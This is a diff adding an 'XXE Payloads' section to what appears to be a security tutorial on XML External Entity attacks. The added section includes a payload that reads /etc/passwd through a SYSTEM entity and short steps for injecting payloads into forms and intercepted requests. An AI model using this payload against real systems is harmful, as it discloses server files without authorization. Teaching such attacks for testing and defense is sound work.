@@ -13,7 +13,7 @@ There are two types of XXE attacks
 
 XML (eXtensible Markup Language) is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. It is a markup language used for storing and transporting data.
 
-### XML Usage
+### XML Basics
 
 #### Why we use XML?
 
@@ -32,7 +32,7 @@ Above the line is called XML prolog and it specifies the XML version and the enc
 
 Every XML document must contain a ROOT element. Ex:
 
-```
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <mail>
    <to>falcon</to>
@@ -52,7 +52,7 @@ Like HTML we can use attributes in XML too. The syntax for having atributes is a
 
 In the above example `category` is the attribute name and `message` is the attribute value.
 
-### DTD
+### DTD File
 
 DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document.
 
@@ -88,7 +88,37 @@ So now let's understand how that DTD validates the XML. Here's what all those te
 
 ## XXE Entry Points
 
+## XXE Payloads
+
+Defining a `ENTITY` called `name` and assigning it a value `feast`. Later we are using that ENTITY in our code.
+
+```xml
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+ <userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+ </userInfo>xml
+```
+
+We can also use XXE to read some file from the system by defining an ENTITY and having it use the SYSTEM keyword
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
+Here again, we are defining an ENTITY with the name `read` but the difference is that we are setting it value to \`SYSTEM\` and path of the file.
+
+{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection" %}
+
 ## Exploiting XXE
+
+Place XML Payloads in input fields and URL parameters i.e. Login forms.
+
+Intercept the request and look for any kind of XML data format.
+
+Replace found XML content with XML payloads.
 
 ## WAF and Filter Evasion
 
